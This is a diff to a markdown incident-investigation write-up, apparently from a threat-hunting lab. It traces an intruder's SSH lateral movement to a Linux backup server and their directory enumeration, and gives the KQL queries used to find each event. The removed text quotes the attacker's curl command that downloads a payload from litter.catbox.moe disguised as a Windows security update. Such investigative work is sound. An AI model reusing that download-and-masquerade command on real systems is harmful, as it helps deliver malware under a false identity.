@@ -19,9 +19,9 @@ The threat actor demonstrated advanced operational maturity through coordinated 
 
 ## Investigation Steps
 
-### 1. Lateral Movement: Remote Access 
+### 1. Lateral Movement: Remote Access & Compromised Account
 
-Searched for evidence of SSH lateral movement and discovered that the threat actor executed the following remote access command from the compromised workstation (azuki-adminpc): "ssh.exe" backup-admin@10.1.0.189. This command established remote access to the Linux backup server at 10.1.0.189 using the backup-admin account. This lateral movement occurred after the initial CEO PC compromise, indicating a deliberate escalation phase targeting recovery infrastructure.
+Searched for evidence of SSH lateral movement and discovered that the threat actor executed the following remote access command from the compromised workstation (azuki-adminpc): "ssh.exe" backup-admin@10.1.0.189. This command established remote access to the Linux backup server at 10.1.0.189. This lateral movement occurred after the initial CEO PC compromise, indicating a deliberate escalation phase targeting recovery infrastructure. In addition, analysis of the SSH connection details confirmed that the attacker used the backup-admin account to access the Linux backup server. This administrative account likely had elevated privileges on the backup infrastructure, providing full access to backup directories and scheduled jobs.
 
 **Query used to locate events:**
 
@@ -45,8 +45,8 @@ Searched for the attack source (i.e., the IP address that initiated the connecti
 
 ```kql
 DeviceNetworkEvents
-| where DeviceName == "azuki-adminpc"
 | where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
+| where DeviceName == "azuki-adminpc"
 | where RemoteIP == "10.1.0.189" and RemotePort == 22
 | project TimeGenerated, DeviceName, LocalIP, RemoteIP, RemotePort, InitiatingProcessCommandLine
 
@@ -55,23 +55,23 @@ DeviceNetworkEvents
 
 ---
 
-### 3. Execution: Malware Download
+### 3. Discovery: Directory Enumeration
 
-Searched for evidence of malware download and discovered that the attacker used the following command to download the malicious archive from the previously identified hosting service (i.e., litter.catbox.moe): "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z. The payload was disguised as a Windows security update (i.e., KB5044273) to appear legitimate and evade suspicion during download and execution phases. 
+Searched for evidence of directory enumeration and discovered that the threat actor executed the following directory listing command with detailed output (-la flags) to enumerate the main backup directory structure: ls --color=auto -la /backups/. This command provided the threat actor with a detailed view of the backup directory structure, file permissions, and timestamps.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
-| where DeviceName == "azuki-adminpc"
-| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
-| where ProcessCommandLine contains "catbox" or ProcessCommandLine contains "litter"
-| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
+| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
+| where DeviceName contains "azuki"
+| where FileName in~ ("ls", "dir", "find")
+| where ProcessCommandLine contains "backup"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 
 ```
-<img width="2556" height="608" alt="BT_Q5" src="https://github.com/user-attachments/assets/d301cdf2-3cc9-43b9-8f9a-fcba0a2959d6" />
+<img width="2699" height="936" alt="DITW_Q4" src="https://github.com/user-attachments/assets/b3be2b8c-61e4-44ca-9c1c-27cf336b7f84" />
 
 ---
 
